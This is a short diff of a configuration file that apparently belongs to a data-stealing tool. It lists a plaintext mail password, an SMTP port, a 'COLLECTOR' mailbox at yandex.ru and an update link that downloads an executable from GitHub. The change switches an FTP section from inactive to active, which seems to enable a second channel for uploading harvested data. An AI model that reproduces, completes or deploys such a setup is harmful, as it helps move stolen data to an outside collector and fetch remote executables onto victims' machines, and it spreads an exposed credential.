@@ -5,7 +5,7 @@ PASSWORD=multihackmultihack
 PORT=465
 COLLECTOR=multihack.update@yandex.ru
 [FTP]
-ACTIVE=FALSE
+ACTIVE=TRUE
 [UPDATE]
 LINK=https://github.com/ZongerX/test/raw/master/Runtimeupdater.exe
 LASTVERSION=2
